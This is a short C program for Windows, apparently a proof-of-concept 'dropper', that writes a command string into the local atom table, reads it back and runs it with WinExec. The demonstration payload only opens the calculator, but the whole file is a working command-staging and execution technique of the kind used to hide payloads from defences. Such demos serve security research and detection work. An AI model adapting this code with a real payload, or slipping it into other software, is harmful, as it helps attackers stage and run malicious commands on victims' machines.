
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

int main() {
    const char* command = "cmd /c start calc.exe";

    printf("[*] Writing to Local Atom Table: %s\n", command);
    ATOM atom = AddAtomA(command);
    if (!atom) {
        printf("[!] Failed to store Atom. Error: %lu\n", GetLastError());
        MessageBoxA(NULL, "Failed to store Atom.", "Dropper Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    printf("[+] Stored Atom ID: 0x%04X (%d)\n", atom, atom);

    char buffer[256] = { 0 };
    if (GetAtomNameA(atom, buffer, sizeof(buffer)) == 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Failed to retrieve atom. Error: %lu", GetLastError());
        MessageBoxA(NULL, msg, "Dropper Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    printf("[+] Retrieved Atom String: %s\n", buffer);
    MessageBoxA(NULL, buffer, "Executing Retrieved Command", MB_OK | MB_ICONINFORMATION);

    WinExec(buffer, SW_SHOW);
    return 0;
}
